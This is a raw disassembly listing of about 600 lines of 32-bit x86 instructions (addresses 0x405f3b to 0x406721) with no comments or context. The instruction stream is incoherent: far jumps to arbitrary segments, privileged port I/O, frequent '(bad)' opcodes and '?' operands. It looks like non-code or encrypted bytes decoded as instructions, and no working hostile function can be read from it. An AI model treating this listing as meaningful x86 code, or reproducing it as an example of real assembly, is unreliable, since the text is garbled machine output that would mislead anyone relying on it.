  405f3b:	adc    BYTE PTR [ebp+0x45],0x63
  405f3f:	jb     0x405f5b
  405f41:	jmp    0x7159:0xaf0c313
  405f48:	pmulhw mm7,mm1
  405f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f4c:	cmp    eax,0xd7e36f00
  405f51:	jmp    0xf101:0x4e716381
  405f58:	mov    ecx,0xe9ee954a
  405f5d:	add    esp,edi
  405f5f:	aaa    
  405f60:	sub    bh,bl
  405f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f63:	dec    esi
  405f64:	jo     0x405ef5
  405f66:	leave  
  405f67:	sbb    al,0x3a
  405f69:	ja     0x405fea
  405f6b:	fwait
  405f6c:	outs   dx,BYTE PTR ds:[esi]
  405f6d:	pop    ss
  405f6e:	pop    DWORD PTR [ebx+0x6d]
  405f71:	pop    edx
  405f72:	out    dx,eax
  405f73:	push   ecx
  405f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f75:	sbb    eax,0x9136e3af
  405f7a:	jmp    0x1c97b6fe
  405f7f:	add    eax,0x1898066e
  405f84:	jle    0x405f23
  405f86:	pop    edx
  405f87:	imul   eax,edx,0xa6f1fc29
  405f8d:	jae    0x405fdb
  405f8f:	dec    edx
  405f90:	ss in  eax,0x44
  405f93:	xchg   esp,eax
  405f94:	sbb    ebp,DWORD PTR [ecx-0x49]
  405f97:	out    0xe3,al
  405f99:	div    DWORD PTR [esi-0xd4e0e1c]
  405f9f:	scas   eax,DWORD PTR es:[edi]
  405fa0:	dec    ecx
  405fa1:	test   eax,0xfe207a3b
  405fa6:	movups XMMWORD PTR [ebx],xmm5
  405fa9:	ins    DWORD PTR es:[edi],dx
  405faa:	outs   dx,BYTE PTR ds:[esi]
  405fab:	fidiv  WORD PTR es:[ebx]
  405fae:	pop    esp
  405faf:	leave  
  405fb0:	lock adc cl,BYTE PTR [edx+edx*8]
  405fb4:	dec    esi
  405fb5:	fwait
  405fb6:	xor    edi,DWORD PTR [ebp-0x2d]
  405fb9:	out    0xe5,eax
  405fbb:	mov    ch,0xc4
  405fbd:	push   es
  405fbe:	mov    dh,0xd3
  405fc0:	jns    0xf1f81175
  405fc6:	dec    esi
  405fc7:	or     al,0x47
  405fc9:	lock add BYTE PTR cs:[ebx-0x3c],cl
  405fce:	lds    esi,FWORD PTR [esi-0x11]
  405fd1:	push   ebx
  405fd2:	and    eax,ebp
  405fd4:	xor    ecx,DWORD PTR [edi+ecx*1]
  405fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd8:	movd   mm2,DWORD PTR [edx+0x18]
  405fdc:	xchg   ebx,eax
  405fdd:	rcr    BYTE PTR [edx+0x33469f1a],1
  405fe3:	mov    ds:0x8741d4f6,al
  405fe8:	pusha  
  405fe9:	xchg   ecx,eax
  405fea:	leave  
  405feb:	and    ch,BYTE PTR [ecx+0x14]
  405fee:	cs jns 0x405fc4
  405ff1:	aam    0xe7
  405ff3:	fnsave [ebx-0x4]
  405ff6:	clc    
  405ff7:	pop    esi
  405ff8:	mov    al,ds:0x113dd8b6
  405ffd:	pop    ebp
  405ffe:	mov    ebx,cs
  406000:	hlt    
  406001:	pop    esp
  406002:	sbb    BYTE PTR [edi-0x79d3c8c3],dh
  406008:	mov    eax,0xd0f070c
  40600d:	pop    eax
  40600e:	adc    ah,ch
  406010:	ds pop edx
  406012:	(bad)  
  406013:	retf   
  406014:	pop    ecx
  406015:	xchg   edi,eax
  406016:	gs push ds
  406018:	sti    
  406019:	pop    ss
  40601a:	(bad)  
  40601b:	shr    DWORD PTR [edi],cl
  40601d:	jb     0x406066
  40601f:	fild   DWORD PTR [esi+0x22]
  406022:	sbb    al,0x89
  406024:	jo     0x40609a
  406026:	mov    ebx,0xd4da8ee1
  40602b:	ja     0x405fb4
  40602d:	dec    esp
  40602e:	lock (bad) 
  406030:	sbb    DWORD PTR [ebp-0x47cba487],edx
  406036:	add    al,0x5
  406038:	das    
  406039:	out    0x69,al
  40603b:	sti    
  40603c:	or     DWORD PTR [eax+edi*2],esp
  40603f:	push   ds
  406040:	fs dec ecx
  406042:	push   edi
  406043:	mov    dl,BYTE PTR [esi+0x2c1729f3]
  406049:	mov    ch,0x6e
  40604b:	lock das 
  40604d:	jl     0x405feb
  40604f:	xchg   ebx,eax
  406050:	cs pop edx
  406052:	popf   
  406053:	es (bad) 
  406055:	xor    DWORD PTR [esi-0x68b94c29],edx
  40605b:	je     0x4060d7
  40605d:	push   ss
  40605e:	scas   al,BYTE PTR es:[edi]
  40605f:	mov    ch,0x7c
  406061:	sub    al,0xe5
  406063:	aaa    
  406064:	jle    0x4060e1
  406066:	fstp   DWORD PTR [esi+0x63]
  406069:	cs xchg esi,eax
  40606b:	in     al,dx
  40606c:	xchg   edi,eax
  40606d:	popf   
  40606e:	pop    ebx
  40606f:	repnz inc DWORD PTR [ebx-0x3d]
  406073:	(bad)  
  406074:	and    al,ah
  406076:	pop    ebp
  406077:	pcmpeqb mm5,QWORD PTR [esi-0x567a41a6]
  40607e:	pop    edx
  40607f:	dec    eax
  406080:	add    dh,BYTE PTR [eax+0x6e]
  406083:	test   al,0x38
  406085:	mov    dl,0x7
  406087:	mov    ch,0xe9
  406089:	neg    ah
  40608b:	gs add al,0xb1
  40608e:	ins    BYTE PTR es:[edi],dx
  40608f:	fs pop es
  406091:	sbb    DWORD PTR [edx+0x1],esi
  406094:	mov    ds:0xfec193fb,al
  406099:	rol    BYTE PTR [edx+0x5dd61930],0x87
  4060a0:	adc    cl,BYTE PTR [edx-0x67]
  4060a3:	(bad)  
  4060a4:	test   eax,0xb0cfb5b8
  4060a9:	inc    ebx
  4060aa:	jbe    0x406084
  4060ac:	hlt    
  4060ad:	(bad)
  4060b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b1:	loope  0x406051
  4060b3:	cmp    dh,BYTE PTR [eax]
  4060b5:	push   es
  4060b6:	push   ecx
  4060b7:	retf   
  4060b8:	mov    al,ds:0x89cf783e
  4060bd:	hlt    
  4060be:	jp     0x4060a2
  4060c0:	fsubp  st(4),st
  4060c2:	pop    edx
  4060c3:	mov    BYTE PTR [ecx+0x593cc6f2],dh
  4060c9:	fwait
  4060ca:	xor    BYTE PTR [esi+0x37],ah
  4060cd:	mov    WORD PTR [edi+0x54],?
  4060d0:	jbe    0x406113
  4060d2:	(bad)  
  4060d3:	out    dx,al
  4060d4:	sahf   
  4060d5:	loop   0x406078
  4060d7:	adc    eax,0x6b950fe1
  4060dc:	jl     0x406070
  4060de:	mov    dl,0x3c
  4060e0:	aad    0x15
  4060e2:	pop    eax
  4060e3:	xchg   DWORD PTR [ebx+esi*2-0x49],edx
  4060e7:	and    DWORD PTR [ecx+0x79550cfc],ebx
  4060ed:	imul   edx,DWORD PTR [edi],0xffffff84
  4060f0:	rcr    BYTE PTR [edx-0x3d],cl
  4060f3:	mov    ecx,0x6d875d31
  4060f8:	mov    edx,0x75e174bb
  4060fd:	loope  0x4060d8
  4060ff:	and    edx,DWORD PTR [edx+0x3a]
  406102:	fdivr  QWORD PTR es:[ecx+0x2b]
  406106:	inc    eax
  406107:	dec    ecx
  406108:	and    bh,ah
  40610a:	aad    0xea
  40610c:	push   edx
  40610d:	jge    0x406151
  40610f:	in     al,dx
  406110:	sbb    BYTE PTR cs:[edx],dl
  406113:	cmp    cl,BYTE PTR [ebx-0x33755560]
  406119:	test   dh,dh
  40611b:	inc    ebx
  40611c:	cld    
  40611d:	rcr    BYTE PTR [ebp+0x62],cl
  406120:	sar    DWORD PTR [esi+0x33ff334a],0x98
  406127:	push   ds
  406128:	retf   
  406129:	into   
  40612a:	dec    ebp
  40612b:	sahf   
  40612c:	adc    ah,BYTE PTR [esi+0x43b42744]
  406132:	and    BYTE PTR ds:0xe6b01b8a,0xe1
  406139:	inc    esi
  40613a:	xchg   edi,eax
  40613b:	sbb    al,0x66
  40613d:	mov    esi,ss
  40613f:	rcl    DWORD PTR [ebp+0x9d8bef9],cl
  406145:	cwde   
  406146:	and    dh,ah
  406148:	xchg   DWORD PTR [ebx-0x2d],esp
  40614b:	ficom  DWORD PTR [esp+eiz*2]
  40614e:	inc    esi
  40614f:	jmp    0xe331:0xa54cd2d2
  406156:	inc    edx
  406157:	xchg   ebp,eax
  406158:	out    0x73,eax
  40615a:	stos   DWORD PTR es:[edi],eax
  40615b:	into   
  40615c:	xor    ah,ch
  40615e:	lods   al,BYTE PTR ds:[esi]
  40615f:	push   ebp
  406160:	fwait
  406161:	inc    edi
  406162:	loop   0x40613d
  406164:	jge    0x4060f1
  406166:	sub    esi,DWORD PTR [ecx+0x7e]
  406169:	test   eax,0x5db8a155
  40616e:	leave  
  40616f:	xchg   edi,eax
  406170:	lods   al,BYTE PTR ds:[esi]
  406171:	mov    cl,0x2d
  406173:	popa   
  406174:	dec    eax
  406175:	mov    ?,WORD PTR [ebp+0x53]
  406178:	jno    0x406178
  40617a:	mov    cl,0x26
  40617c:	xchg   edi,eax
  40617d:	addr16 (bad) 
  40617f:	std    
  406180:	sbb    DWORD PTR [ecx-0xbecd202],edx
  406186:	pop    ebp
  406187:	mov    esi,0x9d970037
  40618c:	cmp    al,0x84
  40618e:	inc    ecx
  40618f:	fwait
  406190:	ins    DWORD PTR es:[edi],dx
  406191:	jnp    0x40617a
  406193:	mov    ecx,0x249ae97b
  406198:	push   esi
  406199:	enter  0x3f7,0xaa
  40619d:	mov    eax,ds:0xdb975ecd
  4061a2:	ins    BYTE PTR es:[edi],dx
  4061a3:	jge    0x406184
  4061a5:	mov    al,0x34
  4061a7:	mov    eax,0x2b2b13b7
  4061ac:	or     al,0x27
  4061ae:	push   0x4679be8
  4061b3:	sbb    BYTE PTR [ecx-0x26c35721],0x9f
  4061ba:	xchg   edx,eax
  4061bb:	mov    ds:0x34019e60,al
  4061c0:	dec    ecx
  4061c1:	shl    BYTE PTR [esi-0x3563bae8],1
  4061c7:	lods   eax,DWORD PTR ds:[esi]
  4061c8:	sub    al,BYTE PTR [eax-0x14040776]
  4061ce:	xchg   DWORD PTR [edi+edi*8-0x23],edi
  4061d2:	cdq    
  4061d3:	fs fwait
  4061d5:	ret    0x91ae
  4061d8:	mov    al,0x7a
  4061da:	std    
  4061db:	pusha  
  4061dc:	add    eax,DWORD PTR [edi-0x6e]
  4061df:	push   0xd48f1d41
  4061e4:	shl    DWORD PTR ds:0x1cca4fb3,1
  4061ea:	(bad)  
  4061eb:	out    0xa6,eax
  4061ed:	stc    
  4061ee:	mov    ebp,0x75c8edde
  4061f3:	stos   DWORD PTR es:[edi],eax
  4061f4:	xor    BYTE PTR [ebp-0x15],dl
  4061f7:	mov    edi,0xae45a3ed
  4061fc:	popa   
  4061fd:	out    0xe8,eax
  4061ff:	test   al,0x1d
  406201:	adc    al,0x46
  406203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406204:	push   esi
  406205:	pop    ss
  406206:	lods   eax,DWORD PTR ds:[esi]
  406207:	test   al,0x7b
  406209:	ins    BYTE PTR es:[edi],dx
  40620a:	cmp    esi,DWORD PTR [edx+0x3f4a1718]
  406210:	and    BYTE PTR [edi+0x41],0xfb
  406214:	aad    0xe5
  406216:	mov    eax,ds:0x1577d371
  40621b:	lea    edi,[ebx+0x6f]
  40621e:	pushf  
  40621f:	out    0x39,al
  406221:	and    al,0x2c
  406223:	jnp    0x406292
  406225:	jg     0x4061e0
  406227:	jl     0x406213
  406229:	jmp    0xeb39f993
  40622e:	xor    ebp,DWORD PTR [ebx]
  406230:	mov    al,0x46
  406232:	xor    BYTE PTR [ebp-0x34924f04],dh
  406238:	ds push edx
  40623a:	(bad)  
  40623b:	sub    DWORD PTR [ecx+0x6b],esi
  40623e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623f:	push   cs
  406240:	mov    ds:0xa56eb142,al
  406245:	ins    DWORD PTR es:[edi],dx
  406246:	stos   BYTE PTR es:[edi],al
  406247:	sbb    edi,DWORD PTR [edi+0x32e5f7e]
  40624d:	cdq    
  40624e:	shl    DWORD PTR [ecx-0x62],1
  406251:	sbb    DWORD PTR [esi-0x62da906d],ebx
  406257:	rcr    dh,cl
  406259:	pop    es
  40625a:	loop   0x40627c
  40625c:	mov    esi,0x25b75359
  406261:	mov    bl,0x2e
  406263:	fidiv  WORD PTR [esp+ebp*1]
  406266:	ret    
  406267:	mov    esp,0xeed49451
  40626c:	jg     0x4062bd
  40626e:	fdivr  st(1),st
  406270:	fadd   DWORD PTR [edx+0x76c19507]
  406276:	mov    dl,0xcb
  406278:	sahf   
  406279:	sbb    DWORD PTR [ebp+0x76],0x9c3b3ed0
  406280:	xchg   esi,eax
  406281:	and    ecx,eax
  406283:	mov    ecx,?
  406285:	jmp    0xb661:0xe81ae503
  40628c:	rcr    DWORD PTR [ecx+0x16],cl
  40628f:	test   DWORD PTR es:[eax-0x3497a1c7],ecx
  406296:	popf   
  406297:	xor    cl,0xcf
  40629a:	iret   
  40629b:	retf   0x2f03
  40629e:	xor    al,0xa1
  4062a0:	inc    BYTE PTR [ebx+0x2a3cc79d]
  4062a6:	je     0x406276
  4062a8:	push   esi
  4062a9:	scas   eax,DWORD PTR es:[edi]
  4062aa:	xchg   ebx,eax
  4062ab:	jmp    0x7e0ba77e
  4062b0:	fbstp  TBYTE PTR [eax+0x6ad14998]
  4062b6:	imul   ecx,DWORD PTR [edx-0x54],0xceca37c0
  4062bd:	inc    edx
  4062be:	dec    edi
  4062bf:	fs xor eax,0xd4e439cb
  4062c5:	(bad)
  4062c8:	sub    DWORD PTR ds:0x79c0f9e2,edi
  4062ce:	xchg   ebp,eax
  4062cf:	ret    
  4062d0:	hlt    
  4062d1:	nop
  4062d2:	outs   dx,BYTE PTR ds:[esi]
  4062d3:	xor    al,0xd0
  4062d5:	jne    0x40625f
  4062d7:	mov    al,ds:0xf1d4b64f
  4062dc:	(bad)  
  4062dd:	cmp    cl,bl
  4062df:	data16 ds cs loopne 0x4062e5
  4062e4:	loope  0x40631d
  4062e6:	mov    ds:0x1e249431,al
  4062eb:	add    al,0xae
  4062ed:	ja     0x406348
  4062ef:	push   edi
  4062f0:	test   al,0xd3
  4062f2:	mov    edi,DWORD PTR [edx-0x28263e8b]
  4062f8:	jmp    0x9a74:0xe49ad51a
  4062ff:	xchg   ecx,eax
  406300:	adc    BYTE PTR [ecx+0x46],ah
  406303:	data16 data16 cmp al,al
  406307:	idiv   al
  406309:	jbe    0x4062c7
  40630b:	and    ah,dl
  40630d:	sar    DWORD PTR [eax-0x15],1
  406310:	jb     0x406338
  406312:	jae    0x4062e7
  406314:	aas    
  406315:	inc    edx
  406316:	jbe    0x406381
  406318:	mov    al,0x82
  40631a:	jae    0x406390
  40631c:	mov    esp,edi
  40631e:	out    dx,eax
  40631f:	jno    0x4062b4
  406321:	cmp    DWORD PTR [edx-0x44a02214],esp
  406327:	sub    DWORD PTR [esi+0x4d],ecx
  40632a:	and    DWORD PTR [esi-0x6f250b9d],esi
  406330:	mov    dl,bh
  406332:	retf   0x4c29
  406335:	sbb    al,0x1e
  406337:	mov    bl,0xb4
  406339:	ret    0x9ae1
  40633c:	pop    edx
  40633d:	retf   
  40633e:	inc    edx
  40633f:	lahf   
  406340:	pop    es
  406341:	ret    
  406342:	xor    al,0x9f
  406344:	cmc    
  406345:	loopne 0x406372
  406347:	call   0x678d2132
  40634c:	(bad)  
  40634d:	shl    BYTE PTR [esi-0xc678ce2],cl
  406353:	popa   
  406354:	inc    ebx
  406355:	scas   eax,DWORD PTR es:[edi]
  406356:	fmul   st(2),st
  406358:	test   al,0xf2
  40635a:	jp     0x40635e
  40635c:	mov    ch,0x9f
  40635e:	pminsw mm6,QWORD PTR [eax]
  406361:	xchg   ebx,eax
  406362:	mov    ah,0x77
  406364:	call   0xcc67f772
  406369:	xchg   ebp,eax
  40636a:	retf   0x7208
  40636d:	mov    al,ah
  40636f:	mov    DWORD PTR [edx-0x3c],eax
  406372:	jle    0x406311
  406374:	sub    eax,0xedce6340
  406379:	daa    
  40637a:	out    dx,eax
  40637b:	pop    eax
  40637c:	adc    DWORD PTR [edi+0x3eed98e5],esp
  406382:	shr    DWORD PTR [ebp-0xa73180a],0x86
  406389:	aas    
  40638a:	and    edi,DWORD PTR [edi+0x78]
  40638d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40638f:	popa   
  406390:	cmp    BYTE PTR [esi+0x79139ea4],ah
  406396:	xchg   ebx,eax
  406397:	popf   
  406398:	cmp    ch,dl
  40639a:	ds es dec esi
  40639d:	pop    esp
  40639e:	(bad)  
  40639f:	sub    al,0x20
  4063a1:	and    al,0xb
  4063a3:	add    BYTE PTR [esi+0x14],cl
  4063a6:	sbb    al,0xe2
  4063a8:	pop    ss
  4063a9:	inc    ecx
  4063aa:	loopne 0x406351
  4063ac:	outs   dx,DWORD PTR ds:[esi]
  4063ad:	mov    ecx,0xf2a51d51
  4063b2:	mov    dl,0xc5
  4063b4:	test   al,0xd6
  4063b6:	stc    
  4063b7:	in     al,0x3b
  4063b9:	js     0x406372
  4063bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063bc:	mov    ds:0xd6259bf,eax
  4063c1:	aas    
  4063c2:	shl    DWORD PTR [ebp+0x41],0xd2
  4063c6:	pop    ecx
  4063c7:	jmp    0xf45f0473
  4063cc:	mov    ebx,0x5c0de94f
  4063d1:	imul   ebx,DWORD PTR [esi],0xffffff84
  4063d4:	mov    dl,0x87
  4063d6:	imul   edx,DWORD PTR [ecx+0xe4ea1c0],0xffffffc5
  4063dd:	fadd   QWORD PTR [esi+ebx*1+0x17953b94]
  4063e4:	jge    0x40637d
  4063e6:	cld    
  4063e7:	neg    BYTE PTR [eax]
  4063e9:	sbb    ebx,DWORD PTR [esi]
  4063eb:	test   ah,ch
  4063ed:	pop    ecx
  4063ee:	mov    esi,0xf9fcc025
  4063f3:	mov    ebx,0xbcfdb9b1
  4063f8:	pop    ds
  4063f9:	push   esi
  4063fa:	iret   
  4063fb:	mov    esi,0x38aa5b6c
  406400:	daa    
  406401:	div    BYTE PTR [ecx]
  406403:	mov    es,WORD PTR [edi-0x667f32cd]
  406409:	ins    DWORD PTR es:[edi],dx
  40640a:	or     dh,dl
  40640c:	icebp  
  40640d:	enter  0x4b08,0x9a
  406411:	sbb    eax,0x9c65f4c6
  406416:	and    BYTE PTR [esi-0x25],bl
  406419:	cs test eax,0x99da7278
  40641f:	ror    BYTE PTR [edx+esi*1+0x42d04d07],0xb8
  406427:	dec    ecx
  406428:	sbb    dh,BYTE PTR [esp+eiz*2+0x24]
  40642c:	retf   0x4c51
  40642f:	adc    dh,bh
  406431:	cdq    
  406432:	stos   DWORD PTR es:[edi],eax
  406433:	jle    0x4063f9
  406435:	jmp    0x413d:0x4ff10f73
  40643c:	int3   
  40643d:	aam    0xe2
  40643f:	into   
  406440:	xchg   esp,eax
  406441:	(bad)
  406444:	inc    ecx
  406445:	adc    ebx,DWORD PTR [edx+0x56c4dcc7]
  40644b:	mov    ch,bh
  40644d:	ins    DWORD PTR es:[edi],dx
  40644e:	bound  ecx,QWORD PTR [ecx-0x59]
  406451:	add    al,0x6d
  406453:	or     DWORD PTR [ecx+0x122a3677],ebp
  406459:	sbb    esi,DWORD PTR [ebx-0x1170a2d1]
  40645f:	aam    0xa2
  406461:	popa   
  406462:	or     al,0x79
  406464:	popf   
  406465:	jnp    0x40640b
  406467:	shr    BYTE PTR [edx+0x60147ed3],cl
  40646d:	test   BYTE PTR ds:0xc659cd6e,bl
  406473:	(bad)  
  406475:	(bad)  
  406476:	ins    DWORD PTR es:[edi],dx
  406477:	xor    al,0x29
  406479:	pop    ecx
  40647a:	xchg   DWORD PTR ds:[esp+eiz*8-0x18408251],ebp
  406482:	mov    dl,0x6b
  406484:	hlt    
  406485:	adc    edi,ebp
  406487:	out    0x5d,al
  406489:	ret    
  40648a:	data16 daa 
  40648c:	dec    edi
  40648d:	pusha  
  40648e:	retf   
  40648f:	arpl   WORD PTR [ebx],di
  406491:	cmp    BYTE PTR [edi+0x7d09ff79],ah
  406497:	fild   DWORD PTR [ebp+0x23b3e640]
  40649d:	add    DWORD PTR [edi+0x63],eax
  4064a0:	pop    ss
  4064a1:	sbb    BYTE PTR [ebx+0x2d],bl
  4064a4:	neg    DWORD PTR [ebx+0x62]
  4064a7:	fsub   DWORD PTR [ebx+0x274cf210]
  4064ad:	jle    0x40646e
  4064af:	add    BYTE PTR [eax-0x5c],bh
  4064b2:	ror    al,0x61
  4064b5:	sti    
  4064b6:	pop    es
  4064b7:	outs   dx,BYTE PTR ds:[esi]
  4064b8:	jl     0x406461
  4064ba:	mov    bh,0x28
  4064bc:	(bad)  
  4064bd:	(bad)  
  4064be:	xor    eax,0x54e58679
  4064c3:	rcr    BYTE PTR [ecx],1
  4064c5:	adc    al,0x24
  4064c7:	stos   BYTE PTR es:[edi],al
  4064c8:	jo     0x406489
  4064ca:	pop    ebp
  4064cb:	mov    al,ds:0xc5e05a3d
  4064d0:	pop    edx
  4064d1:	aas    
  4064d2:	sbb    bl,dl
  4064d4:	push   esi
  4064d5:	loopne 0x4064f9
  4064d7:	sub    edx,DWORD PTR [eax]
  4064d9:	mov    cl,0x2f
  4064db:	mov    ebx,0xaa66cced
  4064e0:	push   ecx
  4064e1:	gs add dh,dh
  4064e4:	sti    
  4064e5:	icebp  
  4064e6:	push   cs
  4064e7:	outs   dx,BYTE PTR ds:[esi]
  4064e8:	call   0x269a:0x393563a1
  4064ef:	fstp   QWORD PTR [esi]
  4064f1:	add    ah,BYTE PTR [bp+si+0x0]
  4064f5:	fild   QWORD PTR [edx-0x80]
  4064f8:	dec    edi
  4064f9:	shr    bl,cl
  4064fb:	lds    eax,FWORD PTR [edx]
  4064fd:	mov    ?,WORD PTR [edi]
  4064ff:	jge    0x4064bd
  406501:	repz mov bh,0xe6
  406504:	mov    ecx,0xd4c6a737
  406509:	add    cl,BYTE PTR [ebp+ebx*2-0x9]
  40650d:	outs   dx,BYTE PTR ds:[esi]
  40650e:	ins    DWORD PTR es:[edi],dx
  40650f:	cmp    BYTE PTR [ecx-0x5f0b4463],cl
  406515:	push   edx
  406516:	scas   al,BYTE PTR es:[edi]
  406517:	mov    ds:0xcee483dd,eax
  40651c:	mov    ds:0x5b5313ac,al
  406521:	imul   ebp,DWORD PTR [ebx+0x457488bd],0xbac361c2
  40652b:	fsub   QWORD PTR [ecx]
  40652d:	jmp    0x28899dc0
  406532:	lds    ecx,FWORD PTR ds:0xe073a0b1
  406538:	dec    esp
  406539:	sbb    esp,DWORD PTR [edx-0x59]
  40653c:	dec    edx
  40653d:	fld    QWORD PTR [edx+eiz*8-0x6dc139b]
  406544:	jae    0x406574
  406546:	or     bl,ah
  406548:	dec    eax
  406549:	shr    BYTE PTR ss:[ebp+0x27e5a1f7],cl
  406550:	push   ecx
  406551:	dec    edi
  406552:	cmc    
  406553:	in     eax,0xc
  406555:	push   0xffffffaf
  406557:	mov    edx,0x142cb6c6
  40655c:	loopne 0x406500
  40655e:	pop    ebp
  40655f:	add    DWORD PTR [ecx-0x6f],edx
  406562:	push   ebx
  406563:	mov    ah,0x17
  406565:	repz rcr ebx,0x2d
  406569:	pushf  
  40656a:	ins    BYTE PTR es:[edi],dx
  40656b:	pop    eax
  40656c:	lahf   
  40656d:	adc    eax,0x8d289033
  406572:	mov    ch,0xa5
  406574:	popa   
  406575:	add    eax,0xa4e301e6
  40657a:	in     al,0x75
  40657c:	rcr    DWORD PTR [esp+ebp*8-0x71],cl
  406580:	fs out dx,al
  406582:	icebp  
  406583:	lds    ecx,FWORD PTR [ebx-0xf]
  406586:	pop    ebx
  406587:	scas   eax,DWORD PTR es:[edi]
  406588:	gs pop ecx
  40658a:	loop   0x4065ce
  40658c:	loop   0x406526
  40658e:	test   DWORD PTR [ecx+eax*2+0x66],0xd5dcc039
  406596:	mov    ecx,0xa28dd06b
  40659b:	sbb    eax,0x54318cc0
  4065a0:	mov    ah,0xfd
  4065a2:	jno    0x40656d
  4065a4:	dec    ebp
  4065a5:	repnz or eax,0x329790e7
  4065ab:	push   eax
  4065ac:	icebp  
  4065ad:	popf   
  4065ae:	sub    eax,0x86d95c03
  4065b3:	(bad)  
  4065b4:	pop    esp
  4065b5:	(bad)  
  4065b6:	lock test al,0x7f
  4065b9:	fwait
  4065ba:	hlt    
  4065bb:	xchg   esi,eax
  4065bc:	or     dl,BYTE PTR [ecx+0x6a]
  4065bf:	popf   
  4065c0:	jg     0x4065e0
  4065c2:	into   
  4065c3:	mov    ds:0x583454ed,eax
  4065c8:	or     DWORD PTR [esp+ebp*1],0x28
  4065cc:	fistp  WORD PTR [esi+ebp*2+0x75]
  4065d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065d1:	into   
  4065d2:	(bad)  
  4065d3:	and    al,0xf7
  4065d5:	mov    eax,ds:0xe42359d8
  4065da:	shr    ah,1
  4065dc:	inc    esp
  4065dd:	jcxz   0x406640
  4065e0:	cld    
  4065e1:	pop    esp
  4065e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e3:	dec    edi
  4065e4:	mov    ah,0x83
  4065e6:	sub    ebx,ebx
  4065e8:	xchg   esi,esp
  4065ea:	mov    esi,0x97be4637
  4065ef:	pop    ds
  4065f0:	mov    ds:0x44a1e02,eax
  4065f5:	hlt    
  4065f6:	mov    ebx,0x5042b6c
  4065fb:	(bad)  
  4065fc:	fist   WORD PTR [esi+0x33]
  4065ff:	sub    BYTE PTR [ebx],dh
  406601:	inc    ebp
  406602:	in     eax,dx
  406603:	sub    eax,0x51908fd8
  406608:	repnz inc ecx
  40660a:	add    eax,0x36ea9f05
  40660f:	mov    edx,?
  406611:	mov    edx,0x4f73cddd
  406616:	in     eax,dx
  406617:	pop    esi
  406618:	xchg   edi,eax
  406619:	sub    BYTE PTR [esi+ecx*2],0xe7
  40661d:	clc    
  40661e:	pop    esp
  40661f:	test   al,0x26
  406621:	push   esi
  406622:	loope  0x40666e
  406624:	mov    ecx,0x3793228c
  406629:	iret   
  40662a:	mov    ebp,0x54a0616f
  40662f:	nop
  406630:	jp     0x406640
  406632:	je     0x4065e7
  406634:	in     eax,dx
  406635:	stos   BYTE PTR es:[edi],al
  406636:	cmp    esi,DWORD PTR [esi]
  406638:	sbb    DWORD PTR ds:0x5646560a,edi
  40663e:	lea    ebp,[edx-0x75d306ac]
  406644:	in     al,dx
  406645:	out    0x20,eax
  406647:	inc    esi
  406648:	std    
  406649:	mov    dh,0xcd
  40664b:	jp     0x4066bc
  40664d:	inc    ebx
  40664e:	cmp    cl,cl
  406650:	mov    ecx,0x6c265ee1
  406655:	test   eax,0x23493133
  40665a:	cs dec esi
  40665c:	cwde   
  40665d:	addr16 call 0x2f4a:0xd354a772
  406665:	lods   eax,DWORD PTR ds:[esi]
  406666:	sahf   
  406667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406668:	f2xm1  
  40666a:	sub    al,0xde
  40666c:	pop    ecx
  40666d:	pop    es
  40666e:	mov    ds:0xa8f77c00,eax
  406673:	cmp    BYTE PTR [ebp+0xc],al
  406676:	les    esi,FWORD PTR [eax+0x0]
  406679:	sbb    DWORD PTR [ecx-0x78a0450b],eax
  40667f:	scas   al,BYTE PTR es:[edi]
  406680:	or     al,al
  406682:	pop    ss
  406683:	sub    eax,0xdfe18e0e
  406688:	or     edx,DWORD PTR [ecx+ebp*8+0x6b]
  40668c:	sahf   
  40668d:	cli    
  40668e:	repnz pop ebx
  406690:	stc    
  406691:	pop    edx
  406692:	dec    eax
  406693:	jecxz  0x4066f8
  406695:	xchg   ecx,eax
  406696:	mov    ds:0x5adadce8,al
  40669b:	aaa    
  40669c:	or     dh,dh
  40669e:	and    DWORD PTR [edi],ebx
  4066a0:	pop    ebp
  4066a1:	loope  0x40666a
  4066a3:	push   es
  4066a4:	mov    dh,0xa6
  4066a6:	addr16 lock push 0xbeff993b
  4066ad:	in     eax,dx
  4066ae:	or     cl,BYTE PTR [esi-0x31]
  4066b1:	cwde   
  4066b2:	pop    edi
  4066b3:	mov    ebx,0x4be12907
  4066b9:	addr16 pop edx
  4066bb:	inc    ebp
  4066bc:	jmp    0x8082:0x156f454e
  4066c3:	dec    eax
  4066c4:	pop    eax
  4066c5:	cdq    
  4066c6:	mov    ebx,0x61c6e992
  4066cb:	jb     0x406662
  4066cd:	jmp    0xbb41:0x71ccb5c4
  4066d4:	icebp  
  4066d5:	rol    BYTE PTR [ecx-0x1f88bec],1
  4066db:	sub    edx,DWORD PTR [edi]
  4066dd:	cmp    esi,ebp
  4066df:	mov    edx,0x2a2f18a2
  4066e4:	add    ebx,DWORD PTR [esi-0x32]
  4066e7:	xchg   edx,eax
  4066e8:	mov    eax,ds:0xd10d3a1
  4066ed:	push   ecx
  4066ee:	pusha  
  4066ef:	or     BYTE PTR [edi-0xa],dh
  4066f2:	mov    ecx,0x2e5e17f4
  4066f7:	scas   eax,DWORD PTR es:[edi]
  4066f8:	or     cl,bl
  4066fa:	mov    dl,0xb6
  4066fc:	scas   eax,DWORD PTR es:[edi]
  4066fd:	adc    dh,BYTE PTR ds:0x24f31872
  406703:	sbb    edx,edx
  406705:	adc    DWORD PTR ds:0x149bad99,esp
  40670b:	lea    ebp,[ebp-0x5]
  40670e:	nop
  40670f:	inc    ebx
  406710:	loope  0x406727
  406712:	daa    
  406713:	add    ebx,edi
  406715:	rcr    edi,cl
  406717:	aad    0x85
  406719:	mov    DWORD PTR [ebp+0x37],eax
  40671c:	pushf  
  40671d:	cli    
  40671e:	add    cl,BYTE PTR [ebp-0x13]
  406721:	add    eax,0xc375a75
